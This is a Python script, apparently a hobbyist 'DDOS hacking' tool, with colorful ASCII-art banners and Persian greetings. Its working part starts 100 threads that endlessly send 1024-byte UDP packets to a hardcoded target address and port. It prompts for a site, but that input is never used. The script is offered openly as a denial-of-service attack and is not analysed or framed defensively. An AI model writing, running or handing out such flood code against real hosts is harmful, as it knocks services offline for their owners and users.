from colorama import Fore,init
init()
print(Fore.LIGHTGREEN_EX+"  ")
name='ali'
if name=='mostafa':
    print('salam mostafa!')
elif name=='zahra':
    print('salam zahra!')
elif name=='amir':
    print('salam amir')
else:
    print('')
    print('  𝗦𝗔𝗟𝗔𝗠 𝗕𝗔𝗥 𝗬𝗢𝗨 ❤️ : ')
    print('')
    from colorama import Fore,init
init()
print(Fore.BLUE+"")



print(Fore.RED+"""

'##::::'##:'########:::'######::'########:'########:'########::
 ###::'###: ##.... ##:'##... ##:... ##..:: ##.....:: ##.... ##:
 ####'####: ##:::: ##: ##:::..::::: ##:::: ##::::::: ##:::: ##:
 ## ### ##: ########::. ######::::: ##:::: ######::: ########::
 ##. #: ##: ##.. ##::::..... ##:::: ##:::: ##...:::: ##.. ##:::
 ##:.:: ##: ##::. ##::'##::: ##:::: ##:::: ##::::::: ##::. ##::
 ##:::: ##: ##:::. ##:. ######::::: ##:::: ########: ##:::. ##:
..:::::..::..:::::..:::......::::::..:::::........::..:::::..::
⠀⠀⠀⠀⠀⠀⠀karrar❤️

""")
print('')
print('')
from colorama import Fore,init
init()
print(Fore.BLUE+"   DOS")



print(Fore.LIGHTGREEN_EX+"""

⠀⠀⠀⠀⠀⣀⣠⠤⠶⠶⣖⡛⠛⠿⠿⠯⠭⠍⠉⣉⠛⠚⠛⠲⣄⠀⠀⠀⠀⠀
⠀⠀⢀⡴⠋⠁⠀⡉⠁⢐⣒⠒⠈⠁⠀⠀⠀⠈⠁⢂⢅⡂⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠀⣼⠀⠀⠀⠁⠀⠀⠀⠂⠀⠀⠀⠀⢀⣀⣤⣤⣄⡈⠈⠀⠀⠀⠘⣇⠀⠀⠀
⢠⡾⠡⠄⠀⠀⠾⠿⠿⣷⣦⣤⠀⠀⣾⣋⡤⠿⠿⠿⠿⠆⠠⢀⣀⡒⠼⢷⣄⠀
⣿⠊⠊⠶⠶⢦⣄⡄⠀⢀⣿⠀⠀⠀⠈⠁⠀⠀⠙⠳⠦⠶⠞⢋⣍⠉⢳⡄⠈⣧
⢹⣆⡂⢀⣿⠀⠀⡀⢴⣟⠁⠀⢀⣠⣘⢳⡖⠀⠀⣀⣠⡴⠞⠋⣽⠷⢠⠇⠀⣼
⠀⢻⡀⢸⣿⣷⢦⣄⣀⣈⣳⣆⣀⣀⣤⣭⣴⠚⠛⠉⣹⣧⡴⣾⠋⠀⠀⣘⡼⠃
⠀⢸⡇⢸⣷⣿⣤⣏⣉⣙⣏⣉⣹⣁⣀⣠⣼⣶⡾⠟⢻⣇⡼⠁⠀⠀⣰⠋⠀⠀
⠀⢸⡇⠸⣿⡿⣿⢿⡿⢿⣿⠿⠿⣿⠛⠉⠉⢧⠀⣠⡴⠋⠀⠀⠀⣠⠇⠀⠀⠀
⠀⢸⠀⠀⠹⢯⣽⣆⣷⣀⣻⣀⣀⣿⣄⣤⣴⠾⢛⡉⢄⡢⢔⣠⠞⠁⠀⠀⠀⠀
⠀⢸⠀⠀⠀⠢⣀⠀⠈⠉⠉⠉⠉⣉⣀⠠⣐⠦⠑⣊⡥⠞⠋⠀⠀⠀⠀⠀⠀⠀
⠀⢸⡀⠀⠁⠂⠀⠀⠀⠀⠀⠀⠒⠈⠁⣀⡤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠶⢤⣤⣤⣤⣤⡤⠴⠖⠚⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")
from colorama import Fore,init
init()
print(Fore.RED+"  ")
site = input("DDOS 𝗛𝗔𝗖𝗞𝗜𝗡𝗚 => ")
import socket
import threading


def attack(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = b'\x00' * 1024  #

    while True:
        client.sendto(bytes, (target_ip, target_port))
        print(f"Sending packets to {target_ip}:{target_port}")


target_ip = "192.168.1.1"  # 
target_port = 80  # 


for i in range(100):  # 
    thread = threading.Thread(target=attack, args=(target_ip, target_port))
    thread.start()
